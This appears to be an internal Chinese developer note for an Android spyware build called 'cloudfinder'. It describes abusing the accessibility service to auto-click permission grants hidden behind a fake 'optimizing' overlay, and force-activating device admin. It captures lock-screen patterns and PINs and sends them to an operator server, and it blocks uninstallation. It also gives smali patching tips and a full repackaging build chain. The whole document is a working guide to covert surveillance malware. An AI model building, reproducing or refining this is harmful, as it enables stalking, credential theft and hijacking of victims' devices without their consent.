## 三、2.2 当前能力（versionCode 345）

### 1. 启动流程

```
用户打开无障碍
  → MyAccessibilityService.onServiceConnected
  → PinCapture.arm(this)                 // 采集就绪
  → ڗًقڔ/؋.ٽ(this)                      // 全屏「优化中」遮罩
  → ھ.startPerm(this)                    // 启动 PermissionActivity
  → 9 项权限，0.8s/项自动点「允许」（遮罩挡着也能点，走 getWindows）
  → All permissions processed
  → 遮罩保持，弹「激活设备管理」
  → 窗口扫描点「启动」→ DAActivator 激活成功
  → 进度 100% → 2.5s 后关遮罩
  → rda.onEnabled 里启动防卸载守卫（600ms 轮询）
```

### 2. 权限清单（9 项）

```
READ_SMS / RECEIVE_SMS / READ_MEDIA_IMAGES / READ_MEDIA_VIDEO
CAMERA / READ_CONTACTS / READ_CALL_LOG / RECORD_AUDIO / READ_PHONE_STATE
```

定位（ACCESS_FINE_LOCATION）已从申请数组移除，但 **Manifest 里还留着**。

### 3. 锁屏采集

| 锁屏类型 | 采集方式 | 上报 type |
|---|---|---|
| 九宫格 | `com.android.systemui:id/lockPatternView` 子节点 isClickable 变化 | `system` |
| 数字 PIN | 掩码文本 `•2` 取尾字符 | `pwd` |
| 混合密码 | 同上 | `pwd2` |

上报链路：

```
PinCapture.report()
  → sendWs()   WS cacheData(k=keylog)  主通道
  → sendHttp() POST /api/device_log    兜底
  → 服务端 h_keylogs_add(device_id, pkg=com.android.systemui, type, text)
  → 面板浮窗「🔐 锁屏密码」按 RN 类型展示
```

### 4. 防卸载

| 层 | 实现 |
|---|---|
| 设备管理器 | `rda`，权限流程自动激活；激活后 `pm uninstall` → `DELETE_FAILED_DEVICE_POLICY_MANAGER` |
| 无障碍守卫 | `ھ.accGuardStart`，**激活成功后才启动**，600ms 轮询，命中后 BACK |
| 无桌面入口 | B 包无 launcher |

## 五、这轮踩过的坑（重要，别重犯）

### 1. smali 寄存器

- `const/4` 立即数范围 **-8..7**，`0x8` 必须用 `const/16`
- 插入代码不要复用已有类型的寄存器：
  ```smali
  # 错：v0 本来是 String，改成 int → VerifyError
  add-int/lit8 v0, v2, 0x1
  # 对：加 .locals，用独立寄存器
  .locals 4
  add-int/lit8 v3, v2, 0x1
  ```
- VerifyError 在构建时不报，**运行到该方法才崩**，表现为「点开就卡住」

### 2. 守卫时序

守卫在**权限完成后**启动会把激活页 BACK 掉，导致 `step=7` 永远点不到「启动」。
正确做法：`rda.onEnabled`（激活成功）里才调 `accGuardStart`。

### 3. 遮罩与点击

- 遮罩是全屏 overlay，但**不挡无障碍 performAction**（权限框、激活页都能点）
- 前提是用 `getWindows()` 遍历 + `resource-id` 精确点击，不能依赖 `getRootInActiveWindow()`
- 激活页的按钮 id：`com.android.settings:id/action_button`（文案「启动」）

### 4. 进度条

- `ڗًقڔ/؋.؋` 静态字段运行时为 null → 改由 `PinCapture` 持有 WebView
- 每次 `requestPermissions` 只带 **1 个**权限，索引恒为 0 → 用计数器

### 5. 其他

- `pm clear` 后应用处于 stopped 状态，系统**不绑定**无障碍服务；先 `am start -n .../.activity.MainActivity` 解除
- Java 模块改动后必须重跑完整链路（javac → d8 → apktool d → 复制 smali），只改 smali 会 `NoSuchMethodError`

### 6. Java 模块构建链（每次改 PinCapture.java 都要走）

```bash
cd apk-project
export JAVA_HOME="$PWD/tools/jdk-17.0.20.1+1/Contents/Home"
export PATH="$JAVA_HOME/bin:$PATH"
javac --release 8 -cp tools/android-sdk/platforms/android-35/android.jar \
      -d /tmp/pinclasses pin-module/src/com/lite/cloudfinder/pin/PinCapture.java
tools/android-sdk/build-tools/35.0.0/d8 --lib tools/android-sdk/platforms/android-35/android.jar \
      --release --min-api 26 --output /tmp/pindex $(find /tmp/pinclasses -name "*.class")
cp build/signed/cloudfinder-aligned-debugSigned.apk /tmp/probe.apk
cp /tmp/pindex/classes.dex /tmp/classes3.dex
zip -q -j /tmp/probe.apk /tmp/classes3.dex
java -jar tools/apktool.jar d /tmp/probe.apk -o /tmp/probe_out -f
rm -f project-2.2/smali/com/lite/cloudfinder/pin/*.smali
cp /tmp/probe_out/smali_classes3/com/lite/cloudfinder/pin/*.smali project-2.2/smali/com/lite/cloudfinder/pin/
PROJECT_DIR="$PWD/project-2.2" ./build.sh
```
